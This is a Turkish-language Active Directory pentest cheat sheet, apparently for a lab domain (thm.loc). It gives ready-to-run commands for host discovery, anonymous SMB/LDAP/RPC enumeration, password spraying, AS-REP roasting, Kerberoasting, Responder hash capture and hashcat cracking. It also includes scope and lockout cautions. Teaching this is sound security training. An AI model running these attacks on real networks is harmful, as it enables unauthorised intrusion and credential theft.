Active Directory İlk Keşif

Sıfırdan başlayan bilgi toplama (Enumeration) rehberi. Elinde hiçbir bilgi yokken — IP, domain adı, paylaşım, kullanıcı ve parolayı adım adım nasıl bulursun? Bir pentestin %80'i buradadır.

Örnek Domain: thm.loc Örnek Kullanıcı: claire Örnek Parola: Password123! Örnek Share: SHARE1 Ağ: 192.168.11.0/24

🧠 Keşif Zihniyeti

Gerçek bir sızma testinde kimse sana IP, domain, kullanıcı adı ve parolayı altın tepside sunmaz. Bunları sen toplarsın. Mantık her zaman şu zincirdir: önce ne var (ağdaki hostlar), sonra bu ne (hangisi DC), sonra bana ne söylüyor (domain, kullanıcılar, paylaşımlar), en sonunda nereye girebilirim (parola/hash).

1 · IP / Host→ 2 · Domain Adı→ 3 · Paylaşımlar→ 4 · Kullanıcılar→ 5 · Parola / Hash→ 6 · SPN Tespiti
Kural: Her adımın çıktısı bir sonraki adımın girdisidir. IP'yi bulmadan domain sorgulayamazsın, kullanıcıları bulmadan parola spraying yapamazsın. Sırayı bozma.

01

IP / Host Keşfi

Host Discovery
Ağda hangi cihazlar ayakta? Hangisi Domain Controller (DC), hangisi normal sunucu/istemci?

Ağa fiziksel ya da VPN ile bağlandın. Elinde sadece bir ağ bloğu var (örn. 192.168.11.0/24). Önce canlı hostları bul, sonra portlarına bakarak DC'yi ayıkla.

🔧 nmap — canlı host + port keşfi

# 1) Ağda kim ayakta? (ping sweep, DNS çözümleme kapalı)
nmap -sn -n 192.168.11.0/24

# 2) DC avı: 88(Kerberos)+389(LDAP)+445(SMB) açık hostları bul
nmap -Pn -p 88,389,445 --open -T4 192.168.11.0/24

# 3) Bulunan hedefte servis/versiyon + tüm AD portları
nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,3269 192.168.11.51

# 4) Sonuçları 3 formatta kaydet (rapor için)
nmap -Pn -p 88,389,445 --open -oA kesif_hosts 192.168.11.0/24
88/tcp kerberos-sec + 389/tcp ldap + 445/tcp microsoft-ds üçlüsünü gördüğün IP → büyük ihtimalle Domain Controller.

🔧 arp-scan / netdiscover — Layer-2 keşif (en güvenilir yerel ağda)

# ARP ile yerel ağdaki tüm cihazları listele (MAC + IP)
sudo arp-scan --localnet
sudo arp-scan -I eth0 192.168.11.0/24

# Pasif/aktif keşif (netdiscover)
sudo netdiscover -r 192.168.11.0/24
sudo netdiscover -p            # tamamen pasif dinleme (sessiz)
Neden ARP? Firewall ICMP (ping) engelliyorsa nmap -sn host'u kaçırabilir. ARP ise aynı ağ segmentinde her cihazı görür — atlanmaz.

🔧 fping / nbtscan — hızlı alternatifler

fping -a -g 192.168.11.0/24 2>/dev/null      # canlı IP listesi
sudo nbtscan 192.168.11.0/24                 # NetBIOS isim + domain/workgroup
02

Domain Adı Tespiti

Domain Enum
Bu makineler hangi domain'e bağlı? (örn. thm.loc) — FQDN ve DC host adını öğren.

IP'yi bulduktan sonra hedef sana domain adını genelde kendisi sızdırır. SMB, LDAP ve NetBIOS servisleri domain adını kimlik doğrulamadan bile verebilir.

🔧 nmap smb-os-discovery — en hızlı yol

nmap -p 445 --script smb-os-discovery 192.168.11.51

# Örnek çıktı:
| smb-os-discovery:
|   OS: Windows Server 2019
|   Computer name: DC01
|   Domain name: thm.loc
|   Forest name: thm.loc
|   FQDN: DC01.thm.loc
Domain adını Domain name: satırında kabak gibi verir. FQDN'i (DC01.thm.loc) not al — Kerberos komutlarında lazım olacak.

🔧 NetExec (nxc) — tek satırda domain + host bilgisi

# Kimliksiz SMB: hostname, domain, signing, OS versiyonu
nxc smb 192.168.11.51

# Örnek çıktı: SMB  192.168.11.51  445  DC01  [*] Windows 10/Server 2019
#             Build 17763 (name:DC01) (domain:thm.loc) (signing:True)

# LDAP üzerinden domain/naming context
nxc ldap 192.168.11.51

🔧 ldapsearch — anonim rootDSE sorgusu

# Kimliksiz: defaultNamingContext = DC=thm,DC=loc
ldapsearch -x -H ldap://192.168.11.51 -s base -b "" \
  defaultNamingContext dnsHostName serverName

🔧 enum4linux-ng / rpcclient — NetBIOS + domain SID

enum4linux-ng -A 192.168.11.51 | grep -iE 'domain|fqdn'

# rpcclient (null session) ile domain bilgisi ve SID
rpcclient -U "" -N 192.168.11.51 -c 'querydominfo;lsaquery'

🔧 Responder — pasif dinleme (domain adı yakalama)

# Sadece dinle (-A analiz modu) — cevap verme, domain trafiğini gör
sudo responder -I eth0 -A
DNS ayarı: Domain adını öğrendikten sonra /etc/resolv.conf'a DC'yi DNS olarak ekle (nameserver 192.168.11.51) — Kerberos/LDAP araçları FQDN çözebilsin.
03

Paylaşım (Share) Keşfi

SMB Enum
Hangi klasörler paylaşıma açık? (örn. SHARE1) — anonim erişilebilen ("Null Session") paylaşım var mı?

Sisteme kullanıcı/parola vermeden ("Null Session") paylaşımları listelemeyi dene. Yönetici anonim erişimi kapatmayı unuttuysa SHARE1, IPC$, SYSVOL gibi paylaşımlar önüne dökülür.

🔧 smbclient — şifresiz listeleme

# -N = No Pass (şifresiz / anonim listeleme)
smbclient -L //192.168.11.51 -N

# Örnek çıktı:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        SHARE1          Disk      Şirket paylaşımı
        SYSVOL          Disk      Logon server share

# Bulunan share'e anonim bağlan ve içine bak
smbclient //192.168.11.51/SHARE1 -N
smb: \> ls
smb: \> recurse ON; prompt OFF; mget *   # tüm içeriği indir

🔧 NetExec — share'ler + okuma/yazma yetkisi

# Anonim / guest ile paylaşımları ve READ/WRITE yetkilerini gör
nxc smb 192.168.11.51 -u '' -p '' --shares
nxc smb 192.168.11.51 -u 'guest' -p '' --shares

# Kimlik bulduktan sonra: içerikte otomatik dosya arama
nxc smb 192.168.11.51 -u claire -p 'Password123!' -M spider_plus

🔧 smbmap — yetki matrisi + içerik arama

# Tüm share'lerde yetki (READ/WRITE) matrisi, özyinelemeli
smbmap -H 192.168.11.51 -u '' -p '' -R --depth 5

# İçerikte hassas dosya deseni ara (parola/config)
smbmap -H 192.168.11.51 -u claire -p 'Password123!' \
  -A '.*\.(txt|xml|ini|config|kdbx)'

🔧 enum4linux-ng — share + tüm SMB bilgisi bir arada

enum4linux-ng -S 192.168.11.51        # sadece shares
enum4linux-ng -A 192.168.11.51        # hepsi (users/groups/shares/policy)
AD'de özellikle SYSVOL ve NETLOGON altın değerindedir — GPP parolaları (Groups.xml içinde cpassword), logon scriptleri ve config dosyaları burada bulunabilir.
# SYSVOL'de GPP cpassword araması (indirdikten sonra)
grep -rniE 'cpassword|password' ./sysvol_dump/ 2>/dev/null
# Bulunan cpassword'ü çöz:
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
04

Kullanıcı Enumeration

User Enum
Sistemde hangi geçerli kullanıcı adları var? (örn. claire, administrator, john)

Geçerli kullanıcı listesi, parola saldırılarının hammaddesidir. RPC/LDAP anonim açıksa liste doğrudan gelir; değilse Kerberos ile bir kelime listesini "bu kullanıcı var mı?" diye sorarsın.

🔧 rpcclient — null session ile tüm kullanıcılar

# Anonim bağlan + kullanıcıları listele
rpcclient -U "" -N 192.168.11.51 -c 'enumdomusers'

# Örnek çıktı:
user:[Administrator] rid:[0x1f4]
user:[claire]        rid:[0x452]
user:[john]          rid:[0x453]

# Grupları ve tek kullanıcı detayını da çek
rpcclient -U "" -N 192.168.11.51 -c 'enumdomgroups'
rpcclient -U "" -N 192.168.11.51 -c 'queryuser 0x452'

🔧 NetExec — RID brute + kullanıcı listesi

# Anonim RID brute (null session kullanıcı bulma)
nxc smb 192.168.11.51 -u '' -p '' --rid-brute 10000

# Kimlikli: domain kullanıcılarını çek + parola politikası
nxc smb 192.168.11.51 -u claire -p 'Password123!' --users
nxc smb 192.168.11.51 -u claire -p 'Password123!' --pass-pol

🔧 Kerbrute — Kerberos ile kullanıcı doğrulama (auth'suz)

# Bir isim listesinden hangileri GERÇEK kullanıcı? (çok sessiz)
kerbrute userenum -d thm.loc --dc 192.168.11.51 users.txt

# Geçerli olanları dosyaya yaz
kerbrute userenum -d thm.loc --dc 192.168.11.51 -o gecerli_kullanicilar.txt users.txt
Neden çalışır? Kerberos, var olmayan kullanıcıya PRINCIPAL_UNKNOWN, var olan kullanıcıya farklı bir hata döner. Bu fark "kullanıcı gerçek mi?" sorusunu parola denemeden yanıtlar.

🔧 enum4linux-ng / ldapsearch — alternatif kaynaklar

enum4linux-ng -U 192.168.11.51        # users (SMB/RPC)

# LDAP kimlik varsa: sadece sAMAccountName çek
ldapsearch -x -LLL -H ldap://192.168.11.51 -D 'claire@thm.loc' -w 'Password123!' \
  -b 'DC=thm,DC=loc' '(&(objectCategory=person)(objectClass=user))' sAMAccountName

💼 OSINT — teknik olmayan yol

  • Şirketin LinkedIn sayfasından çalışan isimlerini topla.
  • E-posta formatını tahmin et (genelde isim.soyisim veya ilkharf+soyisim).
  • username-anarchy ile isimlerden kullanıcı adı listesi üret:
username-anarchy -i isimler.txt > users.txt
# Claire Smith → claire, csmith, claire.smith, smithc ...
05

Parola / Hash Ele Geçirme

Credential Access
Geçerli bir kullanıcının parolasını veya kırılabilir hash'ini ele geçir (örn. claire : Password123!).

Elinde kullanıcı listesi var. Şimdi bir parola bul. Birden fazla yol var — en az gürültülüsünden başla (lockout riskine dikkat!).

🔧 Password Spraying — az parola, çok kullanıcı

# TEK parolayı TÜM kullanıcılara dene (lockout'a karşı güvenli yön)
nxc smb 192.168.11.51 -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute ile (Kerberos üzerinden, --safe = eşik koruması)
kerbrute passwordspray -d thm.loc --dc 192.168.11.51 users.txt 'Sonbahar2026!' --safe

# Mevsim/yıl/şirket kalıpları en sık tutan zayıf parolalardır:
# Password123!  Sirket2026!  Summer2026!  Welcome1
Spraying aktif müdahaledir ve hesap kilitleyebilir. Önce parola politikasını (--pass-pol) öğren: lockout threshold kaç? observation window ne kadar? Deneme sayısını eşiğin altında tut, denemeler arasına bekleme koy.

🔧 AS-REP Roasting — pre-auth kapalı hesaplar

# Ön kimlik doğrulaması kapalı kullanıcıların hash'ini çek (parola gerekmez!)
impacket-GetNPUsers thm.loc/ -usersfile users.txt -dc-ip 192.168.11.51 \
  -no-pass -format hashcat -outputfile asrep.hash

# Hashcat ile kır (mod 18200)
hashcat -m 18200 asrep.hash rockyou.txt

🔧 Kerberoasting — servis hesabı biletleri (kimlik gerekir)

# SPN'li hesapların TGS biletini çek
impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.51 \
  -request -outputfile kerberoast.hash

# Hashcat ile kır (mod 13100)
hashcat -m 13100 kerberoast.hash rockyou.txt

🔧 Responder — LLMNR/NBT-NS zehirleme ile NTLM hash yakalama

# AKTİF mod: sahte sunucu gibi davran, NTLMv2 hash yakala
sudo responder -I eth0

# Yakalanan hash → hashcat mod 5600
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt rockyou.txt
Responder aktif modu ve hash kırma aktif müdahaledir. Yalnızca yazılı kapsam (scope) içinde çalıştır.

🔧 Bulduğun credential'ı doğrula

# "(Pwn3d!)" çıktısı = bu hostta yönetici demektir
nxc smb 192.168.11.51 -u claire -p 'Password123!'
nxc smb 192.168.11.0/24 -u claire -p 'Password123!'   # nerelere giriyor?
06

SPN Tespiti

Kerberoast Hazırlık
Kerberoasting'e uygun SPN (Service Principal Name) tanımlı hesapları bul — bunlar servis hesabıdır ve çoğu zaman yüksek yetkilidir.

SPN, bir servisin (MSSQL, HTTP, CIFS...) hangi hesapla çalıştığını Kerberos'a tanıtan etikettir. servicePrincipalName dolu olan kullanıcı hesapları Kerberoasting adayıdır — biletlerini çekip offline kırabilirsin.

🔧 impacket-GetUserSPNs — en yaygın yol

# Sadece SPN'li hesapları LİSTELE (bilet isteme, önce keşif)
impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.51

# Örnek çıktı:
ServicePrincipalName        Name       MemberOf
--------------------------  ---------  ---------------------------
MSSQLSvc/sql01.thm.loc:1433 sqlsvc     CN=Domain Admins,...
HTTP/web01.thm.loc          websvc

# Tek hedefin biletini iste (-request-user)
impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.51 \
  -request-user sqlsvc

🔧 ldapsearch — ham LDAP ile SPN listesi (auth'lu)

# servicePrincipalName tanımlı KULLANICI hesapları (bilgisayarları hariç tut)
ldapsearch -x -LLL -H ldap://192.168.11.51 -D 'claire@thm.loc' -w 'Password123!' \
  -b 'DC=thm,DC=loc' \
  '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName

🔧 NetExec — tek komutla SPN çek + roast

nxc ldap 192.168.11.51 -u claire -p 'Password123!' --kerberoasting kerb.txt

# AS-REP roastable hesapları da aynı anda:
nxc ldap 192.168.11.51 -u claire -p 'Password123!' --asreproast asrep.txt

🔧 PowerView — Windows tarafından (domain'e bağlı makinede)

Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
Get-NetUser -SPN | select samaccountname,serviceprincipalname
SPN'i Domain Admins üyesi bir servis hesabında görürsen (örnekteki sqlsvc gibi) — bileti kır, parola zayıfsa doğrudan domain yönetimine giden yolu bulmuş olursun.
07

Ek Keşif Araçları

Bonus
İlk keşfi zenginleştiren, otomatikleştiren ve haritalayan yardımcı araçlar.

🔧 ldapdomaindump — LDAP'tan otomatik envanter (HTML rapor)

ldapdomaindump ldap://192.168.11.51 -u 'thm.loc\claire' -p 'Password123!' -o ./dump
# Çıktı: domain_users.html, domain_groups.html, domain_computers.html ...

🔧 bloodhound-python — yetki ilişkilerini topla (Kali collector)

bloodhound-python -u claire -p 'Password123!' -d thm.loc -ns 192.168.11.51 -c All --zip
# Üretilen .zip → BloodHound'a yükle → "Shortest Path to Domain Admins"

🔧 enum4linux-ng (tam mod) — tek komutta özet

enum4linux-ng -A -oJ enum_out 192.168.11.51   # JSON çıktı da üretir

🔧 dig / nslookup / dnsrecon — DNS üzerinden AD keşfi

# DC'yi DNS SRV kayıtlarından bul (domain adını biliyorsan)
dig @192.168.11.51 _ldap._tcp.dc._msdcs.thm.loc SRV
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.11.51

# Otomatik: SRV + zone transfer denemesi
dnsrecon -d thm.loc -n 192.168.11.51 -t std,srv

🔧 Wireshark / tshark — trafikten pasif bilgi

# Kerberos auth eden kullanıcı adlarını canlı yakala
tshark -i eth0 -Y "kerberos.msg_type == 10" -T fields -e kerberos.CNameString
